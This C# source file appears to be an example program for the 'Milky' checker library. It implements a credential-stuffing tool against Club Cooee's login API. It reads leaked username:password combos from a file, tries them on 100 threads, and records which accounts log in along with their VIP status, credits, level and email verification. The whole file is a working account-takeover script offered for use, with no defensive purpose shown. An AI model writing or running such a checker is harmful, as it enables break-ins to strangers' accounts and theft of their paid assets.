using Milky;
using Milky.Enums;
using Milky.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace Milky.Examples
{
    public static class Program
    {
        public static async Task Main()
        {
            var checkerSettings = new CheckerSettings(maxThreads: 100, useProxies: false);

            var outputSettings = new OutputSettings()
            {
                OutputDirectory = "Results",
                OutputInvalids = false,
                CaptureSeparator = " | ",
                HitColor = ConsoleColor.Green,
                FreeColor = ConsoleColor.Cyan,
                InvalidColor = ConsoleColor.Red
            };

            var checker = new CheckerBuilder(checkerSettings, CheckAsync)
                .WithOutputSettings(outputSettings)
                .WithCombos(File.ReadAllLines("combos.txt"))
                .Build();

            var consoleManager = new ConsoleManager(checker);
            _ = consoleManager.StartUpdatingTitleAsync(updateInterval: TimeSpan.FromMilliseconds(33), showFree: true, showPercentages: true, prefix: "Club Cooee Checker — ", suffix: null);
            _ = consoleManager.StartListeningKeysAsync(pauseKey: ConsoleKey.P, resumeKey: ConsoleKey.R, endKey: null);

            await checker.StartAsync();

            await Task.Delay(-1);
        }

        public static async Task<CheckResult> CheckAsync(Combo combo, HttpClient httpClient)
        {
            try
            {
                using var responseMessage = await httpClient.PostAsync("https://en.clubcooee.com/api3/auth_login", new FormUrlEncodedContent(new Dictionary<string, string>()
                {
                    { "username", combo.Username },
                    { "password", combo.Password }
                }));

                var responseString = await responseMessage.Content.ReadAsStringAsync();
                var responseJson = JsonSerializer.Deserialize<JsonElement>(responseString);

                if (responseJson.GetProperty("error").GetBoolean())
                {
                    return new CheckResult(ComboResult.Invalid);
                }

                JsonElement user = responseJson.GetProperty("msg").GetProperty("userdata").GetProperty("auth");

                var captures = new Dictionary<string, object>()
                {
                    { "Username", user.GetProperty("name").GetString() },
                    { "VIP", user.GetProperty("premium").GetBoolean() },
                    { "Cash", user.GetProperty("credits").GetString() },
                    { "Level", user.GetProperty("xp_level").GetInt16() },
                    { "Verified", user.GetProperty("email_confirmed").GetBoolean() }
                };

                return new CheckResult((bool)captures["VIP"] ? ComboResult.Hit : ComboResult.Free, captures);
            }
            catch
            {
                return new CheckResult(ComboResult.Retry);
            }
        }
    }
}
